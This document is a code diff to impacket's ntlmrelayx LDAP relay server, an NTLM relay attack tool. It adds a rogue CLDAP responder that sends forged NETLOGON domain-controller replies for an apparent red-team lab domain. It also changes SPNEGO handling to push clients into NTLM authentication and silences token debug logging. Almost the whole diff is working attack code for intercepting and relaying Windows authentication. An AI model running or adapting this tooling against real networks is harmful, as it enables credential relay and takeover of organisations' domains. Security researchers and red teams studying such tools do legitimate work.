@@ -19,6 +19,7 @@
 #
 from __future__ import division
 from __future__ import print_function
+from binascii import hexlify
 from threading import Thread
 import socket
 import logging
@@ -31,10 +32,16 @@ from threading import Thread
 from impacket.ldap import ldapasn1
 from pyasn1.codec.ber import decoder, encoder
 from pyasn1.type import univ
+from pyasn1_ldap.rfc4511 import LDAPMessage as ParsableLDAPMessage
+from ldap3.protocol.rfc4511 import LDAPMessage, ProtocolOp, SearchResultEntry, PartialAttributeList, PartialAttribute, SearchResultDone, Vals
+from pyasn1.codec.ber import decoder
+from pyasn1.type.namedtype import NamedTypes, NamedType, OptionalNamedType
+from pyasn1.type.univ import Sequence
 from impacket import ntlm
 from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, SPNEGO_NegTokenResp
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_MORE_PROCESSING_REQUIRED
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
+from scapy.all import NETLOGON_SAM_LOGON_RESPONSE_EX, UUID
 
 class LDAPRelayServer(Thread):
     def __init__(self,config):
@@ -70,6 +77,8 @@ class LDAPRelayServer(Thread):
         self.sock.bind((self.config.interfaceIp, self.ldapport))
         self.sock.listen(1)
 
+        CLDAPResponseServer(self.config).start()
+
         while True:
             conn, addr = self.sock.accept()
             logging.info('LDAP connection from %s' % str(addr))
@@ -90,7 +99,7 @@ class LDAPHandler(Thread):
         connection_active = True
         while connection_active:
             try:
-                data = self.conn.recv(1024)
+                data = self.conn.recv(8192)
                 if not data:
                     break
 
@@ -150,7 +159,7 @@ class LDAPHandler(Thread):
 
     def handle_bind_request(self, ldap_message):
         bind_request = ldap_message['protocolOp']['bindRequest']
-        logging.debug("LDAP: Full bind request: %s" % bind_request)
+        #logging.debug("LDAP: Full bind request: %s" % bind_request)
         auth_choice = bind_request['authentication']
         
         logging.debug("LDAP: Received bind request with auth choice: %s" % auth_choice.getName())
@@ -278,7 +287,7 @@ class LDAPHandler(Thread):
 
     def handle_spnego_bind(self, ldap_message, sasl_credentials):
         token = sasl_credentials['credentials']
-        logging.debug("LDAP: Received SPNEGO token: %r" % token)
+        #logging.debug("LDAP: Received SPNEGO token: %r" % token)
         
         if len(token) > 0:
             neg_token_init = None
@@ -288,8 +297,6 @@ class LDAPHandler(Thread):
             except:
                 # It's probably a NTLMSSP AUTH packet
                 mech_token = token.asOctets()
-
-            logging.debug("LDAP: Extracted mech_token: %r" % mech_token)
             
             # Search for the NTLMSSP header
             ntlm_header = b'NTLMSSP\x00'
@@ -298,9 +305,11 @@ class LDAPHandler(Thread):
                 if neg_token_init and len(neg_token_init['MechTypes']) > 0:
                     if neg_token_init['MechTypes'][0] != TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'] and \
                         TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'] in neg_token_init['MechTypes']:
-                        logging.info("NTLM is supported, but not the primary mechtype, so we ask for negotiation")
+                        logging.info("LDAP: NTLM is supported, but not the primary mechtype, so we ask for negotiation")
                         self.spnego_ntlm_reauth_negTokenResp(ldap_message)
-                        return
+                    else:
+                        logging.info("LDAP: NTLM is not a supported mechtype")
+                        self.spnego_ntlm_reauth_negTokenResp(ldap_message)
                 else:
                     logging.error("No NTLM message type")
                 return
@@ -441,4 +450,61 @@ class LDAPHandler(Thread):
         
         self.conn.sendall(encoder.encode(response_ldap_message))
 
+class CLDAPResponseServer(LDAPRelayServer):    
+    def run(self):
+        logging.info("Setting up CLDAP Server on port %s" % self.ldapport)
+        self.sock = socket.socket(self.address_family, socket.SOCK_DGRAM)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.sock.bind((self.config.interfaceIp, self.ldapport))
 
+        while True:
+            message, addr = self.sock.recvfrom(8192)
+            logging.info('CLDAP connection from %s' % str(addr))
+            handler = CLDAPHandler(addr, message, self)
+            handler.start()
+
+class CLDAPHandler(Thread):
+    def __init__(self, addr, message: bytes, server: CLDAPResponseServer):
+        Thread.__init__(self)
+        self.addr = addr
+        self.server = server
+        self.message, _ = decoder.decode(message, asn1Spec=ParsableLDAPMessage())
+
+    def run(self):
+        netlogon_response = NETLOGON_SAM_LOGON_RESPONSE_EX(NtVersion=5, 
+            OpCode=23, 
+            Sbz=0, 
+            Flags=521213,
+            DomainGuid=UUID('645a218b-e184-46ba-a312-fce25ef38b9b'), 
+            DnsForestName=b'lab.redteam.', 
+            DnsDomainName=b'lab.redteam.',
+            DnsHostName=b'win2025vm.lab.redteam.',
+            NetbiosDomainName=b'LAB.',
+            NetbiosComputerName=b'WIN2025VM.',
+            UserName=b'.',
+            DcSiteName=b'Default-First-Site-Name.',
+            ClientSiteName=b'Default-First-Site-Name.',
+            LmNtToken=65535,
+            Lm20Token=65535)
+
+        netlogon_response_vals = Vals().setComponentByPosition(0, netlogon_response.build())
+        pa = PartialAttribute().setComponentByName("type",b"Netlogon").setComponentByName("vals",netlogon_response_vals)
+        pl = PartialAttributeList().setComponentByPosition(0,pa)
+        search_result = SearchResultEntry().setComponentByName("attributes",pl).setComponentByName("object", "")
+
+        op_bindRequest = ProtocolOp().setComponentByName("searchResEntry",search_result)
+
+        message = LDAPMessage().setComponentByName("messageID", self.message["messageID"]._value) \
+                               .setComponentByName("protocolOp", op_bindRequest)
+
+        op_done = ProtocolOp().setComponentByName("searchResDone",
+                        SearchResultDone().setComponentByName("resultCode",0) \
+                                        .setComponentByName("matchedDN","") \
+                                        .setComponentByName("diagnosticMessage",""))
+
+        message_done = LDAPMessage().setComponentByName("messageID", self.message["messageID"]._value) \
+                                    .setComponentByName("protocolOp", op_done)
+
+        logging.debug('Sending CLDAP NETLOGON packet to %s' % str(self.addr))
+        
+        self.server.sock.sendto(encoder.encode(message)+encoder.encode(message_done), self.addr)
